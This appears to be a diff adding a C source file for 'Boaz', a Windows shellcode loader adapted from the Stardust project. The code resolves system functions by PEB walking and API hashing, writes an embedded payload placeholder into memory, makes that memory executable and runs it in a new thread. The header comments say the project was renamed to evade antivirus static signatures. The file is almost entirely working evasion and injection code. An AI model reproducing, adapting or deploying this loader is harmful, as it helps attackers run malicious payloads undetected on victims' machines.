@@ -1,0 +1,152 @@
+// St4rdus7 loader
+/// Add functions in include/Common.h and include/Utils.c
+/// Kernel32 Ntdll and User32 functions are available.
+
+// Project name St4rdus7, to eliminate all the static signature due to the popularity of the St4rdus7 project 
+// I renamed it to Boaz. All the credits goes to the original author --> 5pider, they are brilliant in their work. 
+// I have only made some minor changes to the code to make it adaptable to my little open source project. 
+
+#include <Common.h>
+#include <Constexpr.h>
+#include <windows.h>
+
+    __attribute__((section(".text$E"))) unsigned char magicspell[] = ####MAGICSPELL####;
+
+
+FUNC VOID Main(
+    _In_ PVOID Param
+) {
+
+
+
+    BOAZ_INSTANCE
+
+    PVOID Message = { 0 };
+
+    //
+    // resolve kernel32.dll related functions
+    //
+    if ( ( Instance()->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
+        if ( ! ( Instance()->Win32.LoadLibraryW = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryW" ) ) ) ) {
+            return;
+        }
+        if ( ! ( Instance()->Win32.WaitForSingleObjectEx = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObjectEx" ) ) ) ) {
+            return;
+        }
+        if ( ! ( Instance()->Win32.GetCurrentProcess = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "GetCurrentProcess" ) ) ) ) {
+            return;
+        }
+    }
+
+    if ( ( Instance()->Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) ) {
+        if ( ! ( Instance()->Win32.NtAllocateVirtualMemory = LdrFunction( Instance()->Modules.Ntdll, HASH_STR( "NtAllocateVirtualMemory" ) ) ) ) {
+            return;
+        }
+        if ( ! ( Instance()->Win32.NtProtectVirtualMemory = LdrFunction( Instance()->Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) ) ) ) {
+            return;
+        }
+        if ( ! ( Instance()->Win32.NtWriteVirtualMemory = LdrFunction( Instance()->Modules.Ntdll, HASH_STR( "NtWriteVirtualMemory" ) ) ) ) {
+            return;
+        }
+        if ( ! ( Instance()->Win32.NtCreateThreadEx = LdrFunction( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) ) ) ) {
+            return;
+        }
+        if ( ! ( Instance()->Win32.TpAllocWork = LdrFunction( Instance()->Modules.Ntdll, HASH_STR( "TpAllocWork" ) ) ) ) {
+            return;
+        }
+        if ( ! ( Instance()->Win32.TpPostWork = LdrFunction( Instance()->Modules.Ntdll, HASH_STR( "TpPostWork" ) ) ) ) {
+            return;
+        }
+        if ( ! ( Instance()->Win32.TpReleaseWork = LdrFunction( Instance()->Modules.Ntdll, HASH_STR( "TpReleaseWork" ) ) ) ) {
+            return;
+        }
+    }
+
+    //
+    // resolve user32.dll related functions
+    //
+    if ( ( Instance()->Modules.User32 = Instance()->Win32.LoadLibraryW( L"User32" ) ) ) {
+        if ( ! ( Instance()->Win32.MessageBoxW = LdrFunction( Instance()->Modules.User32, HASH_STR( "MessageBoxW" ) ) ) ) {
+            return;
+        }
+    }
+
+
+    //Get process handle:
+    HANDLE hProcess = Instance()->Win32.GetCurrentProcess();
+    // // define dwMilliseconds:
+    // DWORD dwMilliseconds = 0x1000;
+    // // sleep for 1 second:
+    // Instance()->Win32.WaitForSingleObjectEx(hProcess, dwMilliseconds, NULL); // Wait for the specified duration
+
+    size_t magicspellSize = sizeof(magicspell);
+
+    // open a message box to show the value of magicspellSize:
+    // Instance()->Win32.MessageBoxW(NULL, (LPCWSTR)magicspellSize, L"Boaz MessageBox", MB_OK);
+    // The command above can not print the actual value of magicspellSize to user in message box:
+    // So we need to convert the value of magicspellSize to a string:
+    // Convert the size_t value to a wide string
+
+
+
+    PVOID magicspellAddress = NULL;
+
+    // LPVOID magicspellAddress = Instance.Win32.VirtualAllocEx(hProcess, NULL, magicspellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    //CALL NtAllocateVirtualMemory:
+    NTSTATUS status = Instance()->Win32.NtAllocateVirtualMemory(hProcess, &magicspellAddress, 0, &magicspellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    // printf("NtAllocateVirtualMemory status: %x\n", status);
+    // if function successfully executed, open a message box:
+    if (status == 0) {
+        Instance()->Win32.MessageBoxW(NULL, L"VirtualAllocEx success", L"Boaz MessageBox", MB_OK);
+    }
+
+    // Instance()->Win32.RtlMoveMemory(magicspellAddress, magicspell, sizeof(magicspell));
+    //run NtWriteVirtualMemory:
+    
+    status = Instance()->Win32.NtWriteVirtualMemory(hProcess, magicspellAddress, magicspell, magicspellSize, NULL);
+    if(status == 0) {
+        Instance()->Win32.MessageBoxW(NULL, L"NtWriteVirtualMemory success", L"Boaz MessageBox", MB_OK);
+    }
+
+    DWORD oldProtect;
+    // bool results = Instance()->Win32.VirtualProtectEx(hProcess, magicspellAddress, magicspellSize, PAGE_EXECUTE_READ, &oldProtect);
+    // Use NtProtectVirtualMemory:
+    status = Instance()->Win32.NtProtectVirtualMemory(hProcess, &magicspellAddress, &magicspellSize, PAGE_EXECUTE_READ, &oldProtect);
+    if(status == 0) {
+        Instance()->Win32.MessageBoxW(NULL, L"NtProtectVirtualMemory success", L"Boaz MessageBox", MB_OK);
+    }
+
+
+    // Create a thread:
+    HANDLE hThread = NULL;
+    status = Instance()->Win32.NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, magicspellAddress, NULL, FALSE, 0, 0, 0, NULL);
+    if(status == 0) {
+        Instance()->Win32.MessageBoxW(NULL, L"NtCreateThreadEx success", L"Boaz MessageBox", MB_OK);
+    }
+
+
+    // Creating our TpWorkCallback pointing it to our restore prologue address
+    // PTP_WORK WorkReturn = NULL;
+    // Instance()->Win32.TpAllocWork( &WorkReturn, (PTP_WORK_CALLBACK)magicspellAddress, NULL, NULL );
+    // Instance()->Win32.TpPostWork( WorkReturn );
+    // Instance()->Win32.TpReleaseWork( WorkReturn );
+
+    // Waiting for 1 second to let the TpWorkCallback finish
+    BOOL result = Instance()->Win32.WaitForSingleObjectEx( hProcess, 6000, NULL );
+    if(result == 0) {
+        Instance()->Win32.MessageBoxW(NULL, L"WaitForSingleObjectEx success", L"Boaz MessageBox", MB_OK);
+    }
+
+    // Message = NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer;
+
+    // //
+    // // pop da message
+    // //
+    // Instance()->Win32.MessageBoxW( NULL, Message, L"Boaz MessageBox", MB_OK );
+
+
+
+
+
+}
+
